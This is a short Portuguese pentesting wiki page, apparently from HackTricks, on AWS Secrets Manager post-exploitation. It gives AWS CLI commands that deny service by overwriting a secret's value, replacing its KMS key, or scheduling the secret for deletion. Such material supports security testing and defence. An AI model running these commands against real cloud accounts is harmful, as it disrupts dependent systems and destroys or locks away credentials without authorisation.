# AWS - Secrets Manager Pós Exploração

{{#include ../../../banners/hacktricks-training.md}}

## Secrets Manager

Para mais informações, consulte:

{{#ref}}
../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Ler Segredos

Os **segredos em si são informações sensíveis**, [verifique a página de privesc](../aws-privilege-escalation/aws-secrets-manager-privesc.md) para aprender como lê-los.

### DoS Alterar Valor do Segredo

Alterando o valor do segredo, você poderia **DoS todo o sistema que depende desse valor.**

> [!WARNING]
> Note que os valores anteriores também são armazenados, então é fácil voltar ao valor anterior.
```bash
# Requires permission secretsmanager:PutSecretValue
aws secretsmanager put-secret-value \
--secret-id MyTestSecret \
--secret-string "{\"user\":\"diegor\",\"password\":\"EXAMPLE-PASSWORD\"}"
```
### DoS Alterar chave KMS
```bash
aws secretsmanager update-secret \
--secret-id MyTestSecret \
--kms-key-id arn:aws:kms:us-west-2:123456789012:key/EXAMPLE1-90ab-cdef-fedc-ba987EXAMPLE
```
### DoS Deletando Segredo

O número mínimo de dias para deletar um segredo é 7
```bash
aws secretsmanager delete-secret \
--secret-id MyTestSecret \
--recovery-window-in-days 7
```
{{#include ../../../banners/hacktricks-training.md}}
